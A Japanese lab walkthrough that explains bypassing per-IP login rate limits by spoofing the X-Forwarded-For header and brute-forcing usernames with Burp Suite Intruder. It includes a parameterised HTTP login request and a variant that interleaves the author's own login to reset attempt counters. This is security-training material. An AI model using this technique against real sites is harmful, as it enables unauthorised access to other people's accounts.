# 同一 IP アドレスによるアクセス数制限のあるページを攻撃

※ハッキングラボで実験しています。一般的な Web サイトでは使用しないでください

プロキシ、ロードバランサーを通して Web サーバにアクセスすると、Web サーバから見たクライアント IP アドレスはプロキシのものになります。それを解決するために、プロキシ、ロードバランサでクライアントの IP アドレスを記録します。仲介サーバが増えると、末尾に IP アドレスを付加していきます。

```html
X-Forwarded-For: <client>, <proxy1>, ...</proxy1></client>
```

ただし、クライアントで http リクエストを改変し、X-Forwarded-For の IP アドレスを自由に変更することが出来ます。(IP スプーフィング)

Web サイトによっては、同一 IP アドレスでのログイン試行に制限を儲けている場合がありますが、このような Web サイトに対してブルートフォース攻撃を仕掛けることを考えます。

- 1. Burp Suite を起動します
- 2. Proxy タブからブラウザーを起動
- 3. 攻撃対象 Web サイトにログインします
- 4. HttpHistory からログインリクエストを選択し、Send to intruder する
     ![1](https://github.com/pea-sys/Til/assets/49807271/83046723-79d7-4240-9a30-e5ca77a8684b)

* 5. intruder で ip アドレスとログイン id をパラメータ化します

```
POST /login HTTP/2
Host: 0a3600e804248a3c8088cb4600de0090.web-security-academy.net
Cookie: session=VfKHOww2FZ2QhRBzyYx6Iu1Z7mBNlcaT
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0a3600e804248a3c8088cb4600de0090.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3600e804248a3c8088cb4600de0090.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
X-Forwarded-For: §ip§

username=§id§&password=pass
```

- 6. Attack type を Pitchfork にします
- 7. Payload タブを選択し、1 つ目のパラメータに数字をセットし、2 つ目のパラメータに id リストをセットします
     ![2](https://github.com/pea-sys/Til/assets/49807271/4dc8259a-6dd5-4213-ae0a-d0353263e29b)

- 8. Start Atack 押下で攻撃を開始します。

※別パターンとして、ログインに成功すると試行回数をリセットする仕組みを入れている Web サイトの場合は、自分のアカウントのログインを都度攻撃に挟みこむことでブルートフォース攻撃が出来る
